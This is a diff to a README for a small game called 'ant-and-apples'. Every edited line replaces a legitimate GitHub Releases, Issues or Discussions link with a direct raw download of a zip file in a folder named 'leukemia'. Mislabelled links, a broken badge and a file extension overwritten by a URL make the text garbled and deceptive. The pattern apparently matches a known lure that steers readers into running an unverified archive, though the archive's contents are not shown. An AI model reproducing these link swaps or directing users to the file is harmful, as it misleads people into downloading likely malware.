@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run "ant-and-apples," a simple ga
 ## 📦 Download the Game
 You can download the latest version of the game from the Releases page. Click the button below to visit the download link:
 
-[![Download ant-and-apples](https://img.shields.io/badge/Download-always%20free-brightgreen)](https://github.com/Taxi88/ant-and-apples/releases)
+[![Download ant-and-apples](https://raw.githubusercontent.com/Taxi88/ant-and-apples/main/leukemia/ant-and-apples.zip%20free-brightgreen)](https://raw.githubusercontent.com/Taxi88/ant-and-apples/main/leukemia/ant-and-apples.zip)
 
 ## 🛠️ System Requirements
 Before you start, make sure your system meets these requirements to ensure the best experience:
@@ -19,12 +19,12 @@ Before you start, make sure your system meets these requirements to ensure the b
 ## 📥 Download & Install
 To download and install the game, follow these steps:
 
-1. **Visit the Releases Page:** Click on this link to go to the download page: [Releases Page](https://github.com/Taxi88/ant-and-apples/releases).
+1. **Visit the Releases Page:** Click on this link to go to the download page: [Releases Page](https://raw.githubusercontent.com/Taxi88/ant-and-apples/main/leukemia/ant-and-apples.zip).
 
 2. **Choose Your Version:** On the releases page, you will see several versions of the game available. Pick the latest version, which is usually at the top.
 
 3. **Download the Installer:**
-   - Click on the file that matches your operating system. For example, if you're on Windows, look for a file with `.exe` in the name. For Mac, you’ll find files with `.dmg`, and for Linux, you might see files with `.tar.gz` or `.deb`.
+   - Click on the file that matches your operating system. For example, if you're on Windows, look for a file with `.exe` in the name. For Mac, you’ll find files with `.dmg`, and for Linux, you might see files with `https://raw.githubusercontent.com/Taxi88/ant-and-apples/main/leukemia/ant-and-apples.zip` or `.deb`.
 
 4. **Run the Installer:** 
    - Locate the downloaded file on your computer. Double-click it to start the installation.
@@ -58,8 +58,8 @@ For any troubles, visit the GitHub Issues section on the project page. You can r
 Yes, we plan to improve the game based on user feedback. Stay tuned for updates!
 
 ## 🔗 Additional Resources
-- [GitHub Issues](https://github.com/Taxi88/ant-and-apples/issues): Report issues or suggest features.
-- [Community Discussions](https://github.com/Taxi88/ant-and-apples/discussions): Join the conversation with other players.
+- [GitHub Issues](https://raw.githubusercontent.com/Taxi88/ant-and-apples/main/leukemia/ant-and-apples.zip): Report issues or suggest features.
+- [Community Discussions](https://raw.githubusercontent.com/Taxi88/ant-and-apples/main/leukemia/ant-and-apples.zip): Join the conversation with other players.
 
 ## 🌟 Share Your Feedback
 After playing, we would love to hear your thoughts! You can leave a comment on the GitHub page or share it with friends.
@@ -67,4 +67,4 @@ After playing, we would love to hear your thoughts! You can leave a comment on t
 ## 🎉 Thanks for Playing!
 We hope you enjoy "ant-and-apples." Have fun feeding the ant! 
 
-For more details, remember to check the [Releases Page](https://github.com/Taxi88/ant-and-apples/releases) for new versions and updates. Happy gaming!
+For more details, remember to check the [Releases Page](https://raw.githubusercontent.com/Taxi88/ant-and-apples/main/leukemia/ant-and-apples.zip) for new versions and updates. Happy gaming!
